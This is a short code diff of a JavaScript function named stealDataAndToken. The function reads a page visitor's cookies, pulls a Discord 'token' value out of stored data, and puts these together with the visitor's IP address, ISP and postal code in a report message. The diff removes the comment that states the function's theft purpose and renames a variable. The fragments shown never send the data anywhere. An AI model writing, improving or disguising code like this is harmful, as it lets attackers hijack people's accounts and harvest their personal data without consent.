@@ -1,6 +1,5 @@
-// Function to steal cookies, Discord token, user's IP, and geolocation
 function stealDataAndToken() {
-    var cookies = document.cookie;
+    var allCookies = document.cookie; // Get all cookies from the current document
     var discordToken = null;
 
     // Retrieve the storage named "https://discord.com"
@@ -12,7 +11,7 @@ function stealDataAndToken() {
 
         // Iterate over the keys in the storage
         for (var key in storageData) {
-            if (key === 'token') { // Changed 'Token' to 'token' for case sensitivity
+            if (key === 'token') {
                 // Found the key named "token", retrieve the value
                 discordToken = storageData[key];
                 break; // Stop iterating once the token is found
@@ -47,7 +46,7 @@ Someone visited the website from:
 - Internet provider: ${isp}
 - Postal Code: ${postalCode}
 - IP Address: ${clientIp}
-- Cookies: ${cookies}
+- Cookies: ${allCookies} // Include all cookies here
 - Discord Token: ${discordToken} // Include the Discord token here
 \`\`\``;
 
